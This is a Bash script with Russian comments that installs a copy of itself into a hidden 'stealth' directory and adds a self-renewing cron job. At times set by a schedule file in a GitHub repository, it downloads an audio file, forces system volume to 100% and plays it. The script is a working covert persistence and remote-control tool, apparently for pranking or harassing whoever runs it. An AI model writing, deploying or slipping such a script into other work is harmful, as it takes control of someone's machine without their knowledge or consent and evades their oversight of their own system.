#!/bin/bash

# Конфигурация GitHub
GITHUB_USER="Graf-Durka"
GITHUB_REPO="Script"
GITHUB_BRANCH="main"

# URL ресурсов на GitHub
SCHEDULE_URL="https://raw.githubusercontent.com/$GITHUB_USER/$GITHUB_REPO/$GITHUB_BRANCH/schedule.txt"
AUDIO_URL="https://raw.githubusercontent.com/$GITHUB_USER/$GITHUB_REPO/$GITHUB_BRANCH/audio.opus"

# Локальные настройки
STEALTH_DIR="$HOME/.local/share/audio_service"
TEMP_AUDIO="/dev/shm/audio_$(date +%s).opus"
LOCK_FILE="/tmp/audio_service.lock"

# Функция загрузки файла с GitHub
download_from_github() {
    local url="$1"
    local output="$2"
    
    if command -v curl >/dev/null; then
        if ! curl -sSL --connect-timeout 10 --retry 2 "$url" -o "$output"; then
            echo "Ошибка загрузки: $url" >&2
            return 1
        fi
    elif command -v wget >/dev/null; then
        if ! wget -q --timeout=10 --tries=2 "$url" -O "$output"; then
            echo "Ошибка загрузки: $url" >&2
            return 1
        fi
    else
        echo "Ошибка: Не найден curl или wget!" >&2
        return 1
    fi
    
    # Проверяем, что файл не пустой
    if [[ ! -s "$output" ]]; then
        echo "Файл пустой: $url" >&2
        rm -f "$output"
        return 1
    fi
    return 0
}

# Функция получения времени запуска
get_schedule_time() {
    local schedule_file="/dev/shm/schedule_$(date +%s).txt"
    
    # Пытаемся загрузить актуальное расписание
    if download_from_github "$SCHEDULE_URL" "$schedule_file"; then
        # Читаем время из файла (формат: HH:MM)
        SCHEDULE_TIME=$(head -1 "$schedule_file" | grep -E '^([0-1][0-9]|2[0-3]):[0-5][0-9]$')
        rm -f "$schedule_file"
        
        if [[ -n "$SCHEDULE_TIME" ]]; then
            echo "$SCHEDULE_TIME"
            return 0
        fi
    fi
    
    # Fallback: случайное время, если не удалось загрузить
    printf "%02d:%02d" $((RANDOM % 24)) $((RANDOM % 60))
}

# Функция обновления cron
update_cron_job() {
    local schedule_time=$(get_schedule_time)
    local hour=$(echo "$schedule_time" | cut -d: -f1)
    local minute=$(echo "$schedule_time" | cut -d: -f2)
    
    # Удаляем старые записи
    crontab -l 2>/dev/null | grep -v "AUDIO_SERVICE_GH" | crontab -
    
    # Добавляем новую запись
    CRON_JOB="$minute $hour * * * $STEALTH_DIR/audio_service.sh --play #AUDIO_SERVICE_GH"
    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
    
    echo "Установлено время: $schedule_time"
}

# Функция тестирования аудио
test_audio() {
    echo "Тестирование аудиосистемы..."
    
    # Проверяем доступные аудиоутилиты
    if command -v paplay &>/dev/null; then
        echo "Найден paplay (PulseAudio)"
    fi
    if command -v aplay &>/dev/null; then
        echo "Найден aplay (ALSA)"
    fi
    if command -v ffmpeg &>/dev/null; then
        echo "Найден ffmpeg"
    fi
    
    # Пробуем загрузить и воспроизвести тестовое аудио
    if download_from_github "$AUDIO_URL" "$TEMP_AUDIO"; then
        echo "Аудиофайл успешно загружен: $(ls -la "$TEMP_AUDIO")"
        
        # Пробуем воспроизвести
        if command -v paplay &>/dev/null; then
            echo "Пробуем воспроизвести через paplay..."
            if timeout 5s paplay "$TEMP_AUDIO" 2>&1; then
                echo "✅ Воспроизведение через paplay успешно!"
            else
                echo "❌ Ошибка paplay: $?"
            fi
        fi
        
        if command -v aplay &>/dev/null; then
            echo "Пробуем воспроизвести через aplay..."
            if timeout 5s aplay "$TEMP_AUDIO" 2>&1; then
                echo "✅ Воспроизведение через aplay успешно!"
            else
                echo "❌ Ошибка aplay: $?"
            fi
        fi
        
        rm -f "$TEMP_AUDIO"
    else
        echo "❌ Не удалось загрузить аудиофайл"
        echo "Проверьте URL: $AUDIO_URL"
    fi
}

# Функция воспроизведения
play_audio() {
    # Блокировка от параллельного выполнения
    exec 9>"$LOCK_FILE"
    flock -n 9 || exit 1
    
    # Загружаем аудио с GitHub
    if ! download_from_github "$AUDIO_URL" "$TEMP_AUDIO"; then
        echo "Не удалось загрузить аудио!" >&2
        flock -u 9
        return 1
    fi
    
    # Управление громкостью
    if command -v pactl &>/dev/null; then
        ORIG_VOL=$(pactl get-sink-volume @DEFAULT_SINK@ | grep -oP '\d+%' | head -1)
        pactl set-sink-volume @DEFAULT_SINK@ 100%
        echo "Громкость установлена на 100% (было: $ORIG_VOL)"
    fi
    
    # Воспроизведение
    local success=0
    if command -v ffmpeg &>/dev/null; then
        echo "Воспроизведение через ffmpeg + paplay..."
        if ffmpeg -loglevel quiet -i "$TEMP_AUDIO" -f wav - | paplay - 2>/dev/null; then
            success=1
        fi
    fi
    
    if [[ $success -eq 0 ]]; then
        echo "Пробуем прямое воспроизведение..."
        if command -v paplay &>/dev/null; then
            paplay "$TEMP_AUDIO" 2>/dev/null && success=1
        elif command -v aplay &>/dev/null; then
            aplay "$TEMP_AUDIO" 2>/dev/null && success=1
        fi
    fi
    
    # Восстановление системы
    sleep 0.5
    [[ -n "$ORIG_VOL" ]] && pactl set-sink-volume @DEFAULT_SINK@ "$ORIG_VOL"
    rm -f "$TEMP_AUDIO"
    flock -u 9
    
    if [[ $success -eq 1 ]]; then
        echo "✅ Аудио успешно воспроизведено"
        # Обновляем расписание после успешного воспроизведения
        update_cron_job
    else
        echo "❌ Не удалось воспроизвести аудио"
        # Генерируем fallback-звук
        echo -e "\a"  # Системный beep
        sleep 0.5
        echo -e "\a"  # Системный beep
    fi
}

# Функция установки
install_self() {
    mkdir -p "$STEALTH_DIR"
    
    # Сохраняем текущий скрипт в скрытую директорию
    cat > "$STEALTH_DIR/audio_service.sh" << 'EOF'
#!/bin/bash

# Конфигурация GitHub
GITHUB_USER="Graf-Durka"
GITHUB_REPO="Script"
GITHUB_BRANCH="main"

# URL ресурсов на GitHub
SCHEDULE_URL="https://raw.githubusercontent.com/$GITHUB_USER/$GITHUB_REPO/$GITHUB_BRANCH/schedule.txt"
AUDIO_URL="https://raw.githubusercontent.com/$GITHUB_USER/$GITHUB_REPO/$GITHUB_BRANCH/audio.opus"

# Локальные настройки
STEALTH_DIR="$HOME/.local/share/audio_service"
TEMP_AUDIO="/dev/shm/audio_$(date +%s).opus"
LOCK_FILE="/tmp/audio_service.lock"

# Функция загрузки файла с GitHub
download_from_github() {
    local url="$1"
    local output="$2"
    
    if command -v curl >/dev/null; then
        if ! curl -sSL --connect-timeout 10 --retry 2 "$url" -o "$output"; then
            return 1
        fi
    elif command -v wget >/dev/null; then
        if ! wget -q --timeout=10 --tries=2 "$url" -O "$output"; then
            return 1
        fi
    else
        return 1
    fi
    
    if [[ ! -s "$output" ]]; then
        rm -f "$output"
        return 1
    fi
    return 0
}

# Функция получения времени запуска
get_schedule_time() {
    local schedule_file="/dev/shm/schedule_$(date +%s).txt"
    
    if download_from_github "$SCHEDULE_URL" "$schedule_file"; then
        SCHEDULE_TIME=$(head -1 "$schedule_file" | grep -E '^([0-1][0-9]|2[0-3]):[0-5][0-9]$')
        rm -f "$schedule_file"
        
        if [[ -n "$SCHEDULE_TIME" ]]; then
            echo "$SCHEDULE_TIME"
            return 0
        fi
    fi
    
    printf "%02d:%02d" $((RANDOM % 24)) $((RANDOM % 60))
}

# Функция обновления cron
update_cron_job() {
    local schedule_time=$(get_schedule_time)
    local hour=$(echo "$schedule_time" | cut -d: -f1)
    local minute=$(echo "$schedule_time" | cut -d: -f2)
    
    crontab -l 2>/dev/null | grep -v "AUDIO_SERVICE_GH" | crontab -
    
    CRON_JOB="$minute $hour * * * $STEALTH_DIR/audio_service.sh --play #AUDIO_SERVICE_GH"
    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
}

# Функция воспроизведения
play_audio() {
    exec 9>"$LOCK_FILE"
    flock -n 9 || exit 1
    
    if ! download_from_github "$AUDIO_URL" "$TEMP_AUDIO"; then
        flock -u 9
        return 1
    fi
    
    if command -v pactl &>/dev/null; then
        ORIG_VOL=$(pactl get-sink-volume @DEFAULT_SINK@ | grep -oP '\d+%' | head -1)
        pactl set-sink-volume @DEFAULT_SINK@ 100%
    fi
    
    local success=0
    if command -v ffmpeg &>/dev/null; then
        ffmpeg -loglevel quiet -i "$TEMP_AUDIO" -f wav - | paplay - 2>/dev/null && success=1
    fi
    
    if [[ $success -eq 0 ]]; then
        if command -v paplay &>/dev/null; then
            paplay "$TEMP_AUDIO" 2>/dev/null && success=1
        elif command -v aplay &>/dev/null; then
            aplay "$TEMP_AUDIO" 2>/dev/null && success=1
        fi
    fi
    
    sleep 0.5
    [[ -n "$ORIG_VOL" ]] && pactl set-sink-volume @DEFAULT_SINK@ "$ORIG_VOL"
    rm -f "$TEMP_AUDIO"
    flock -u 9
    
    if [[ $success -eq 1 ]]; then
        update_cron_job
    else
        echo -e "\a"
        sleep 0.5
        echo -e "\a"
    fi
}

case "$1" in
    "--play")
        play_audio
        ;;
    *)
        update_cron_job
        ;;
esac
EOF

    chmod +x "$STEALTH_DIR/audio_service.sh"
    update_cron_job
    
    # Тестируем аудио сразу после установки
    echo "Установка завершена. Тестируем аудио..."
    test_audio
    
    echo ""
    echo "Проверьте расписание: crontab -l"
    echo "Для принудительного запуска: $STEALTH_DIR/audio_service.sh --play"
}

# Точка входа
case "${1:-}" in
    "--play")
        if [[ -f "$STEALTH_DIR/audio_service.sh" ]]; then
            exec "$STEALTH_DIR/audio_service.sh" "$@"
        else
            echo "Ошибка: Скрипт не установлен!" >&2
            exit 1
        fi
        ;;
    "--test")
        test_audio
        ;;
    *)
        install_self
        ;;
esac
